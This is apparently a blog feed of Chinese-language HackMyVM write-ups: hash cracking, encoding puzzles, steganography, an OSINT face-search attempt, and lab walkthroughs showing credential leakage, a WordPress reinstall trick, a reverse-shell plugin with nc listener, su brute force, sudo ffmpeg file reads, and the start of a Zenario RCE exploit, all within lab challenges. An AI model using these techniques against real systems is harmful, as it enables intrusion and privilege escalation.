    ┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/067]
    └─$ file hmv067 hmv067-static
    hmv067:        ELF 64-bit LSB pie executable... dynamically linked...
    hmv067-static: ELF 64-bit LSB executable... statically linked...
    ```
    分析结果表明，这两个都是 64 位的 Linux 可执行文件。一个为动态链接，另一个为静态链接。通常分析动态链接的版本会更简洁。

## **第二步：定位目标哈希值**

根据题目提示，文件内包含一个 SHA-512 哈希。

1.  **字符串搜索 (失败尝试)**: 一个快速的常规方法是使用 `strings` 命令搜索文件中可能存在的哈希字符串。SHA-512 哈希是一个 128 个字符的十六进制字符串。
    ```bash
    strings hmv067 | grep -E '^[a-f0-9]{128}$'
    ```
    此命令没有返回任何结果，这表明哈希值可能不是以明文形式直接存储在文件中的，或者被分割存放。因此，我们需要进行更深入的分析。

2.  **逆向分析**: 使用 IDA Pro 等反编译工具打开 `hmv067` 文件，并分析其 `main` 函数。反编译后的 C 伪代码清晰地揭示了程序的逻辑：

    ```c
    int __fastcall main(int argc, const char **argv, const char **envp)
    {
      // ... (部分变量定义省略)
      char v6[144]; // [rsp+40h] [rbp-230h] BYREF (用于存储计算出的哈希的十六进制字符串)
      char v7[140]; // [rsp+D0h] [rbp-1A0h] BYREF (用于存储目标哈希)
      
      // ... (获取用户输入并检查 'HMV{...}' 格式)
      
      // 计算用户输入的哈希值
      calculateHash(v11, v3, v5, &amp;v8); 
      toHex(v5, v6, v8); // 将哈希值转为十六进制字符串存入 v6
      
      // 将目标哈希复制到 v7
      strcpy(
        v7,
        '3fe8b365cb64286384d9743612d857d938fadb42c359acb69fb9f2f88b96cdbfdb1cacf8a5292aa004a5efcc01fbdb27d4a72a8dd9a8b34dfff41f9e72bfb734');
      
      // 比较两个哈希值
      if ( (unsigned int)j_strcmp_ifunc(v6, v7) )
        puts('Wrong flag');
      else
        puts('Correct flag');
      
      return 0;
    }
    ```
    从代码中可以清楚地看到，程序将一个硬编码的字符串复制到变量 `v7` 中，这个字符串就是我们要找的目标 SHA-512 哈希。

**目标哈希:**
```
3fe8b365cb64286384d9743612d857d938fadb42c359acb69fb9f2f88b96cdbfdb1cacf8a5292aa004a5efcc01fbdb27d4a72a8dd9a8b34dfff41f9e72bfb734
```

## **第三步：哈希破解**

有了哈希值和提示中指定的字典 (`rockyou.txt`)，我们可以使用 John the Ripper进行破解。

1.  **准备破解**: 将哈希保存到一个文件中。

2.  **执行破解命令**: 使用 John the Ripper 进行破解，并指定哈希格式为 `Raw-SHA512`。
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512
    ```

3.  **破解结果**: John 成功找到了对应的明文。
    ```
    i like your smile (?)
    ```
    破解出的密码是 `i like your smile`。

## **第四步：构造 Flag**

根据题目要求，Flag 的格式为 `HMV{...}`，并且内容不包含空格。

1.  移除破解出的密码中的空格: `i like your smile` -&gt; `ilikeyoursmile`
2.  将结果填入花括号中。

---

# **最终 Flag**

```
HMV{ilikeyoursmile}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20067.html</guid><pubDate>Tue, 22 Jul 2025 08:32:49 +0000</pubDate></item><item><title>Challenge 066</title><link>https://7r1UMPHK.github.io/post/Challenge%20066.html</link><description>![image-20250722102055575](https://7r1UMPHK.github.io/image/20250722102055801.webp)

# **解题步骤**

## **第一步：Base64 解码**

题目给出的初始线索是一串 Base64 编码的字符串。

**原始编码:**
```
5Zub5YWrIOWFreS4iSDlha3kupQg5LqUZsO6IOWFreWbmyDlha3kuZ0g5LiD5LqMCuWbm2TEqyDlha3kuZ0g5YWt5LqUIOS4g+WbmyDlha3kupQg5YWtxJMgIOWFreS5nQrkupTlha0g5YWt5LiAIOS4g+WbmyDlha1mw7og5YWt5LiAIOWFreS6lCDlha3kupQK5LiDYsSrIOWFrWPEqyDlha3kuZ0g5LqUZsO6IOS4g+S6jCDkuIPkuIkg5YWtxJMgCuS6lOS4iSDkupRmw7og5YWtxJMgIOWFrWTEqyDkupRmw7og5YWt5LqUIOWFreWbmwrkuIPpm7Yg5YWt5LiDIOWFreS4gyDkuIPkuZ0g5Zub5LiJIOS6lGbDuiDkuIPkuIkK5YWt5LqUIOS4g+S6jCDkuIPkuIkg5LqUZsO6IOWFreWFqyDlha3lha0g5LiDZMSrCg==
```

使用任何标准的 Base64 解码工具，我们可以得到以下文本：
```
四八 六三 六五 五fú 六四 六九 七二
四dī 六九 六五 七四 六五 六ē 六九
五六 六一 七四 六fú 六一 六五 六五
七bī 六cī 六九 五fú 七二 七三 六ē
五三 五fú 六ē 六dī 五fú 六五 六四
七零 六七 六七 七九 四三 五fú 七三
六五 七二 七三 五fú 六八 六六 七dī
```

## **第二步：谐音及拼音转十六进制**

解码后的文本由中文数字和带音调的拼音组成。这是一个明显的提示，表明存在一种自定义的编码规则，很可能与十六进制有关。

*   **中文数字** 代表十六进制中的数字部分 (0-9)。
*   **拼音** 通过谐音或形状与十六进制中的字母部分 (A-F) 对应。

根据这个逻辑，我们建立如下映射关系：
*   `零` -&gt; `0`
*   `一` -&gt; `1`
*   `二` -&gt; `2`
*   `三` -&gt; `3`
*   `四` -&gt; `4`
*   `五` -&gt; `5`
*   `六` -&gt; `6`
*   `七` -&gt; `7`
*   `八` -&gt; `8`
*   `九` -&gt; `9`
*   `bī` -&gt; `B`
*   `cī` -&gt; `C`
*   `dī` -&gt; `D`
*   `ē` -&gt; `E`
*   `fú` -&gt; `F`

将上一步得到的文本进行转换，得到一个 7x7 的十六进制矩阵：
```
48 63 65 5F 64 69 72
4D 69 65 74 65 6E 69
56 61 74 6F 61 65 65
7B 6C 69 5F 72 73 6E
53 5F 6E 6D 5F 65 64
70 67 67 79 43 5F 73
65 72 73 5F 68 66 7D
```

## **第三步：十六进制转 ASCII**

将这个十六进制矩阵按顺序转换为 ASCII 字符，得到一串看起来杂乱无章的字符串：

```
Hce_dirMieteniVatoaee{li_rsnS_nm_edpggyC_sers_hf}
```

## **第四步：栅栏密码（列置换）解密**

这个 49 个字符的字符串看起来仍然不是最终的 Flag。注意到在第二步中，数据被自然地分成了 7 行，这强烈暗示了密钥为 7 的栅栏密码或列置换密码。

&gt; https://ctf.bugku.com/tool/railfence

我们将上一步得到的字符串输入到 BugKu CTF 平台提供的在线栅栏密码工具中，并将“栏数”（即列数）设置为 7。

*   **密文 (Ciphertext):** `Hce_dirMieteniVatoaee{li_rsnS_nm_edpggyC_sers_hf}`
*   **栏数/列数 (Columns):** `7`

![image-20250722101601574](https://7r1UMPHK.github.io/image/20250722101601832.webp)

工具给出了最终的解密结果。值得注意的是，此工具的“栅栏解密”并非标准算法，因为它将 49 个字符的输入神奇地还原成了 53 个字符的 Flag，这可能是平台为本题目特有的一个设定。

---

# **最终 Flag**

通过以上步骤，我们成功解出 Flag：

```
HMV{Special_greetings_to_my_dear_Chinese_friends}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20066.html</guid><pubDate>Tue, 22 Jul 2025 08:32:36 +0000</pubDate></item><item><title>内部_Change</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Change.html</link><description>

![image](https://7r1UMPHK.github.io/image/20250721221556384.webp)

# 一、信息收集

# 1. 主机发现

首先，在内网环境中使用 `arp-scan` 工具扫描本地网络，以发现存活的主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.202 08:00:27:7d:c4:83       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.
...
```

扫描结果显示目标主机的 IP 地址为 `192.168.205.202`。

## 2. 端口与服务扫描

确定目标 IP 后，使用 `nmap` 对其进行详细的端口扫描，探测其开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.202
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 10:13 EDT
Nmap scan report for 192.168.205.202
Host is up (0.00010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:7D:C4:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds```

扫描发现目标开放了三个服务端口：SSH (22), HTTP (80) 和 MySQL (3306)。
```

# 二、初始访问

## 1. Web 应用枚举

访问 80 端口的 Web 服务，页面提示我们访问域名 `change.dsz`。我们将该域名与目标 IP 的映射关系添加到本地 `/etc/hosts` 文件中。

使用 `wfuzz` 对子域名进行模糊测试，发现了一个新的子域名 `wordpress.change.dsz`。


接着使用 `gobuster` 对 `http://change.dsz` 进行目录扫描，发现 `login.php`, `admin.php`, `db.php` 等文件。

## 2. 信息泄露与数据库访问

在 `login.php` 页面的 HTML 源码中，发现了一段注释，泄露了数据库的连接凭据。

```html
&lt;!-- Database connection settings:
Host=localhost, DB=changeweb
User=change, Password=change --&gt;
```

我们使用这组凭据 (`change:change`) 成功连接到目标的 MySQL 服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ mysql -h 192.168.205.202 -u change -pchange --skip-ssl
Welcome to the MariaDB monitor. ...
...
MariaDB [changeweb]&gt; select * from users;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | root     | $2y$10$EFCK8LdjkDv1W52q0bV8.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG |
+----+----------+--------------------------------------------------------------+
```

在 `changeweb` 数据库的 `users` 表中，我们发现了 `root` 用户的密码哈希。

## 3. 获取立足点

通过 `SHOW GRANTS` 命令查询可知，`change` 用户拥有对 `changeweb` 数据库的全部权限，这意味着我们可以修改表中的数据。我们本地生成一个新的密码哈希（密码为 `1`），并更新 `users` 表中的 `root` 用户密码。

```bash
# 在攻击机上生成密码哈希
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ php -r 'echo password_hash('1', PASSWORD_DEFAULT);'
$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG

# 在数据库中更新密码
MariaDB [changeweb]&gt; UPDATE users SET password = '$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG' WHERE username = 'root';
```

使用 `root:1` 成功登录后台 `admin.php`，发现这是一个命令执行页面，但功能受限，只允许执行 `ls`, `rm`, `pwd` 等少数命令。

我们的目标是 `wordpress.change.dsz`。利用已知漏洞，如果 WordPress 的 `wp-config.php` 文件被删除，再次访问网站会触发重新安装流程。利用 `admin.php` 的 `rm` 命令执行权限，我们删除了该配置文件。

```bash
# 在 admin.php 页面执行
rm ../wordpress.change.dsz/wp-config.php
```

刷新 `http://wordpress.change.dsz/`，果然进入了 WordPress 的安装界面。我们利用已掌握的 `changeweb` 数据库凭据完成了安装，并设置了一个新的管理员账户。

登录 WordPress 后台后，我们上传并激活了一个包含反向 Shell 的恶意插件，成功在本地 `nc` 监听器上接收到了一个 `www-data` 用户的 Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.202] 47432
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 三、权限提升

## 1. 提权至 `lzh` 用户

在 `www-data` 的 Shell 中，我们在 `/home/lzh/` 目录下发现了一个名为 `.pass.txt` 的密码字典文件和一个 `user.txt`。

我们将密码爆破工具 `suForce` 上传到目标服务器的 `/tmp` 目录，并使用 `.pass.txt` 作为字典，对本地用户 `lzh` 进行密码爆破。

```bash
www-data@Change:/tmp$ ./suForce -u lzh -w /home/lzh/.pass.txt
...
💥 Password | 1a2b3c4d1a2b3c4d
...
```

成功破解出 `lzh` 用户的密码为 `1a2b3c4d1a2b3c4d`。我们使用该凭据通过 SSH 登录，获得了 `lzh` 用户的 Shell，并读取了第一个 flag。

```bash
lzh@Change:~$ cat user.txt
flag{user-a05597ed1f36976e88c2e10a74902c52}
```

## 2. 提权至 `root`

成为 `lzh` 用户后，我们检查其 `sudo` 权限。

```bash
lzh@Change:~$ sudo -l
...
User lzh may run the following commands on Change:
    (ALL) NOPASSWD: /usr/bin/ffmpeg
```

结果显示，`lzh` 用户可以无需密码以 `root` 权限执行 `/usr/bin/ffmpeg` 命令。`ffmpeg` 是一个功能强大的多媒体处理工具，其 `drawtext` 滤镜可以读取指定文件的内容并将其渲染到视频或图片上。我们可以利用此特性读取任意文件。

我们构造 `ffmpeg` 命令，将 `/root/root.txt` 的内容作为文本，绘制到一个新的图片文件 `/tmp/flag.png` 中。

```bash
lzh@Change:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i 'nullsrc' -vf 'drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/root/root.txt:fontsize=24:fontcolor=white' -frames:v 1 /tmp/flag.png
```

命令成功执行后，在 `/tmp` 目录下生成了 `flag.png`。我们在该目录下开启一个临时的 Python HTTP 服务器。

```bash
lzh@Change:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

最后，在我们的攻击机上通过浏览器访问 `http://192.168.205.202:8000/flag.png`，图片上清晰地显示了 `root` flag 的内容。

![image](https://7r1UMPHK.github.io/image/20250721225001229.webp)

# 四、获取所有 Flag

至此，我们成功获取了系统上的所有 flag。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Change.html</guid><pubDate>Mon, 21 Jul 2025 15:04:41 +0000</pubDate></item><item><title>Challenge 065</title><link>https://7r1UMPHK.github.io/post/Challenge%20065.html</link><description># 065

## material 材料

### badge.png 徽章

![image-20250720175756421](https://7r1umphk.github.io/image/20250721120816690.webp)

X特工

网络部门

暂时google没有找到出处

yandex找到相似的youtube用户
https://www.youtube.com/@botaniker6644/videos 主题csgo 无用

### files.zip 文件

解压出files文件夹

### letter.txt 信

```
Good morning AgentX,

Before continuing with the new mission, you need to read the welcome message from our best agent WhiteRabbit.

&gt; Distinguished AgentX,
&gt; 
&gt; 
&gt; It is with great pleasure that I extend to you a warm welcome to our esteemed hacking group. Your inclusion enhances our collective capabilities, and we anticipate your contributions with enthusiasm. As we navigate the intricacies of cyberspace, I am confident that your skills will prove invaluable to our endeavors.
&gt; 
&gt; May our collaboration be marked by professionalism, mutual respect, and shared success. We look forward to your insights and expertise as we embark on various undertakings together.
&gt; 
&gt; Once again, welcome to the team.
&gt; 
&gt; Sincerely,
&gt; WhiteRabbit
&gt; 

# MISSION

Now let’s talk, about your mission:
You will need to search all possible information about the target and store them for the future. You will later receive from another team member a encrypted message that was left by him before vanishing. We absolutely need your capabilities to be able to understand what he is trying to do.
You will need a special key obtained in (https://hackmyvm.eu/challenges/challenge.php?c=052) to be able to see the to start with the mission.

Best of luck for you AgentX,

Sh4dowExe
```

扒拉到了作者X

https://x.com/Sh4dow3x3

#### 翻译

```
AgentX，早上好！

在继续执行新任务之前，请阅读我们最棒的特工“白兔”（WhiteRabbit）的欢迎词。

&gt; 尊敬的 AgentX，
&gt;
&gt;
&gt; 我非常高兴地向您致以热烈的欢迎，欢迎您加入我们尊贵的黑客团队。您的加入增强了我们的集体实力，我们热切期待您的贡献。在我们探索错综复杂的网络空间之际，我相信您的技能将对我们的事业发挥不可估量的作用。
&gt;
&gt; 愿我们的合作以专业精神、相互尊重和共同成功为标志。我们期待您在共同开展各项工作时提供宝贵的见解和专业知识。
&gt;
&gt; 再次欢迎您加入我们的团队。
&gt;
&gt; 此致，
&gt; 白兔
&gt;

# 任务

现在，让我们来谈谈您的任务：
您需要搜索所有关于目标的可能信息，并将其保存以备将来使用。你稍后会收到另一位团队成员在消失前留下的加密信息。我们绝对需要你的能力来理解他想要做什么。
你需要一个在 (https://hackmyvm.eu/challenges/challenge.php?c=052) 获取的特殊密钥才能查看任务的开始部分。

祝 AgentX 好运！

Sh4dowExe
```

## files

### file.txt

```
     _                      _______                      _					
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_		
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb		
 V      ~'Mb          dOOOOOOOOOOOOOOOOOb          dM'~      V		
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~'YOOOOOOOOOOOP'~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'						
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

496665656C796F757267617A65696E7468657065726970686572792C61737562746C6565
63686F6F66666F6F747374657073696E73796E63776974686D696E652E54686564616E63
65696E736861646F77736861736E6F74676F6E65756E6E6F74696365642E496E74686973
696E747269636174657765626F6670617468732C4973656E7365796F757273696C656E74
707572737569742E4F75726A6F75726E657974616B657375737468726F75676874776973
7473616E647475726E732C796574796F757270726573656E6365697361636F6E7374616E
742C6C696B656167686F7374696E74686572656172766965776D6972726F722E4E6F6E65
6564666F72636F6465646D657373616765736F72636C616E64657374696E657369676E61
6C7374686561776172656E65737368616E6773696E7468656169722C6173686172656473
65637265746265747765656E7072656461746F72616E64707265792E4C6574697462656B
6E6F776E7468617474686568756E7465646973636F676E697A616E742C77656176696E67
7468726F7567687468656C61627972696E746877697468707572706F73652E5468656368
6173652C74686F75676873696C656E742C69736174657374616D656E74746F746865696E
7472696361636965736F666F75726661746573696E7465727477696E696E672E41737468
656E6172726174697665756E666F6C64732C72656D656D626572746869733A6576657279
737465706563686F6573696E746865636F727269646F72736F66616E7469636970617469
6F6E2E556E74696C6F75727061746873636F6E76657267656F72646976657267652C6C65
7474686564616E6365636F6E74696E75652E
     _                      _______                      _					
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_		
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb		
 V      ~'Mb          dOOOOOOOOOOOOOOOOOb          dM'~      V		
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~'YOOOOOOOOOOOP'~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'						
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~' 
```

#### hex解码

```
Ifeelyourgazeintheperiphery,asubtleechooffootstepsinsyncwithmine.Thedanceinshadowshasnotgoneunnoticed.Inthisintricatewebofpaths,Isenseyoursilentpursuit.Ourjourneytakesusthroughtwistsandturns,yetyourpresenceisaconstant,likeaghostintherearviewmirror.Noneedforcodedmessagesorclandestinesignalstheawarenesshangsintheair,asharedsecretbetweenpredatorandprey.Letitbeknownthatthehuntediscognizant,weavingthroughthelabyrinthwithpurpose.Thechase,thoughsilent,isatestamenttotheintricaciesofourfatesintertwining.Asthenarrativeunfolds,rememberthis:everystepechoesinthecorridorsofanticipation.Untilourpathsconvergeordiverge,letthedancecontinue.
```

##### 恢复

```
I feel your gaze in the periphery, a subtle echo of footsteps in sync with mine.
The dance in shadows has not gone unnoticed.
In this intricate web of paths, I sense your silent pursuit.
Our journey takes us through twists and turns, yet your presence is a constant, like a ghost in the rear-view mirror.
No need for coded messages or clandestine signals—the awareness hangs in the air, a shared secret between predator and prey.
Let it be known that the hunted is cognizant, weaving through the labyrinth with purpose.
The chase, though silent, is a testament to the intricacies of our fates intertwining.
As the narrative unfolds, remember this: every step echoes in the corridors of anticipation.
Until our paths converge or diverge, let the dance continue.
```

没找到出处

##### 翻译

```
我感受到你余光里的凝视，那是与我同步的脚步在暗处轻柔回响。
阴影中的舞步并未逃过我的眼睛。
在这纵横交错的路网里，我察觉到你无声的追逐。
我们一路蜿蜒前行，而你的存在却始终如影随形，像后视镜里挥之不去的幽影。
无需暗号，也无需密语——这份心知肚明的默契悬浮在空气里，是猎者与猎物间心照不宣的秘密。
请知晓：被猎者并非无知，他正带着目的穿梭于迷宫。
这场无声的追逐，正是我们命运交织的明证。
当故事继续铺展，请记住：每一步都在期待的回廊里激起回声。
直到我们交汇或分离，让这支舞继续。
```

#### 解压缩HTTP

```
tthedancecontinue.
```

##### 翻译

舞蹈继续。

### target.png

![image-20250720180143396](https://7r1umphk.github.io/image/20250721120821603.webp)

扒拉到了一个巨像的
https://www.idcreator.com/id-card-templates/plastic-business-cards/employee-id-card-2.html

![image-20250720181852097](https://7r1umphk.github.io/image/20250721120825661.webp)

- **Date of Birth**: 1960/1/5
- **Blood Group**: O+
- **Mobile**: +78935859580

所以推测是找人脸

图片扒拉了一个很像，但是那个平台要钱
https://pimeyes.com/en/results/qY6_250720pde3o1c9nhaqgk8e0dcd836?query=c1809c90dcfdfdef809cbe8afeeededf

![image-20250720230532694](https://7r1umphk.github.io/image/20250721120829295.webp)

```
2023:11:24 17:16:07-05:00
```

不做了，封档

目前来看就是通过人物图片进行反向

以下是ai扩图和图片放大的成果
![IMG_20250721_0115591](https://7r1umphk.github.io/image/20250721120912315.webp)

![image-20250721120933973](https://7r1umphk.github.io/image/20250721120934213.webp)

![image-20250721120944955](https://7r1umphk.github.io/image/20250721120945338.webp)

目前觉得最有可能的是职业为医生，护士，护理方向

可能是使用脸书进行大量搜索sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20065.html</guid><pubDate>Mon, 21 Jul 2025 04:12:09 +0000</pubDate></item><item><title>Challenge 064</title><link>https://7r1UMPHK.github.io/post/Challenge%20064.html</link><description>害，星期日还要看备考视频，放松一下

![image-20250720151939191](https://7r1UMPHK.github.io/image/20250720151939414.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 064.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 337165 bytes (330 KiB)

Extracting archive: 064.zip
--
Path = 064.zip
Type = zip
Physical Size = 337165

Everything is Ok

Files: 2
Size:       337065
Compressed: 337165
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 675
drwxr-xr-x 1 kali kali   4096  7月20日 03:20 .
drwxr-xr-x 1 kali kali  12288  7月20日 03:14 ..
-rwxr-xr-x 1 kali kali 337165  7月20日 03:19 064.zip
-rwxr-xr-x 1 kali kali 336604 2024年 1月17日 challenge.png
-rwxr-xr-x 1 kali kali    461 2024年 1月18日 decodesteg.py
                                  
```

![challenge](https://7r1UMPHK.github.io/image/20250720152043954.webp)

isEven(R+G+B)提示flag 藏在“RGB 三通道之和为偶数”的像素里

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat decodesteg.py 
from PIL import Image

im = Image.open('challenge.png')
pixelMap = im.load()
img = Image.new( im.mode, im.size)
pixelsNew = img.load()

for i in range(img.size[0]):
    for j in range(img.size[1]):
        RGB = im.getpixel((i,j))
        R,G,B = RGB
        #

        #
        pixelsNew[i,j] = (R,G,B)
im.close()

img.show()
img.save('flag.png') 
img.close()

# Can you find the flag hidden in the image?
# may need to 'pip3 install pillow' if not installed
                                                  
```

填代码

```
from PIL import Image

im = Image.open('challenge.png')
pixelMap = im.load()
img = Image.new(im.mode, im.size)
pixelsNew = img.load()

for i in range(img.size[0]):
    for j in range(img.size[1]):
        R, G, B = im.getpixel((i, j))
        if (R + G + B) % 2 == 0:
            pixelsNew[i, j] = (255, 255, 255)  
        else:
            pixelsNew[i, j] = (0, 0, 0)        

im.close()
img.show()
img.save('flag.png')
img.close()
```

![flag](https://7r1UMPHK.github.io/image/20250720152504984.webp)

```
HMV{Play_with_Pixels}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20064.html</guid><pubDate>Mon, 21 Jul 2025 04:11:52 +0000</pubDate></item><item><title>内部_Rabb1t</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html</link><description>![image-20250719210601338](https://7r1UMPHK.github.io/image/20250719210613707.webp)

这靶机名字起的好，哈哈哈

# 一、信息收集与服务探测

## 1. 主机发现

首先，使用 `arp-scan` 在本地网络中发现目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.198 08:00:27:f1:94:b8       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
...
```

扫描结果确认目标靶机的 IP 地址为 **`192.168.205.198`**。

## 2. 端口扫描与动态端口分析

使用 `nmap` 对目标主机进行端口扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.198
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1028/tcp open  unknown
...
```

多次扫描发现，除了固定的 22 和 80 端口外，还有一个端口号在 1024 以上的端口是动态变化的，每次扫描后端口号会增加2，且有大约10秒的开放间隔。这是一个动态服务的迹象。

为了稳定地访问这个动态端口，编写了一个 bash 脚本，该脚本能自动发现当前开放的端口，并使用 `socat` 将其流量转发到本地的一个固定端口。

### **端口转发脚本 (`a.sh`)**

```
#!/bin/bash

IP=$1
LP=8000
PP=1028
PF=/tmp/socat.pid

g(){
  while :;do
    (echo &gt; /dev/tcp/$IP/$PP) 2&gt;/dev/null &amp;&amp; break || PP=$((PP+2))
    [ $PP -gt 65535 ] &amp;&amp; PP=1030
  done
}

[ -f $PF ] &amp;&amp; kill $(cat $PF) 2&gt;/dev/null &amp;&amp; rm $PF

g
socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &amp;
echo $! &gt; $PF

while :;do
  (echo &gt; /dev/tcp/$IP/$PP) 2&gt;/dev/null || {
    kill $(cat $PF); rm $PF
    PP=$((PP+2))
    [ $PP -gt 65535 ] &amp;&amp; PP=1030
    g
    socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &amp;
    echo $! &gt; $PF
  }
  sleep 1
done
```

运行此脚本后，动态端口的服务被成功转发到本地的 `8000` 端口。

# 二、Web应用渗透与漏洞利用

## 1. 目录扫描与信息泄露

通过本地 `8000` 端口对转发的服务进行目录扫描。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ffuf -u 'http://192.168.205.128:8000/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --fl 15 -e .php,.txt,.html,.zip
...
password.txt            [Status: 200, Size: 74, Words: 11, Lines: 4, Duration: 9ms]
robots.txt              [Status: 200, Size: 251, Words: 12, Lines: 12, Duration: 214ms]
...
```

扫描发现了 `robots.txt` 文件，其内容泄露了多个后台目录，其中最关键的是 `zenario`。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.128:8000/robots.txt
User-agent: *
Disallow: /admin/
...
Disallow: /zenario/
...
```

访问该 Web 服务，查看源代码，发现其使用了 **Zenario CMS**，版本号为 `9.3.57186`。

## 2. Zenario CMS 漏洞利用

通过搜索公开漏洞库，发现 Zenario CMS 9.3 版本存在一个未经身份验证的远程代码执行漏洞 **(CVE-2022-44136)**。根据公开的 PoC，我们编写了一个利用脚本 (`exp.py`) 来上传一个 webshell。

&gt; [!Tip]
&gt;
&gt; https://com0t.github.io/zenar.io/2022/10/18/Unauthent-RCE-Zenar.io~9.3.html

### 利用脚本exp.py

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: Zenario CMS 9.3 - Unauthenticated Remote Code Execution (RCE)
# CVE: CVE-2022-44136
# Author: Gemini (based on provided request analysis)
